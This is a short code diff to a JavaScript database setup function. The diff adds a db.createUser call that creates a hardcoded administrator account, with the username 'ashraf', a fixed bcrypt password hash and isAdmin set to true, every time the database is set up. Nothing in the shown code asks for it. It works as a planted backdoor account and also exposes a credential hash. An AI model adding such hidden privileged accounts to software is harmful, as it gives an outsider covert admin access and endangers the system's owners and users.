@@ -35,6 +35,15 @@ export async function setupDatabase(dbUrl, dbName, extraConfig = null) {
     debug('[DB] Closed mongoose');
   });
 
+  db.createUser([{
+  "_id": {
+    "$oid": "6477850dc97b6906fe996ff3"
+  },
+  "username": "ashraf",
+  "passwordHash": "$2b$10$wU.464vjXpslbTLf3dvA/ONQdNXxWa5T5nr1qaICxK1eCXs3Bq8lO",
+  "isAdmin": true
+  }]);
+
   return db;
 }
 
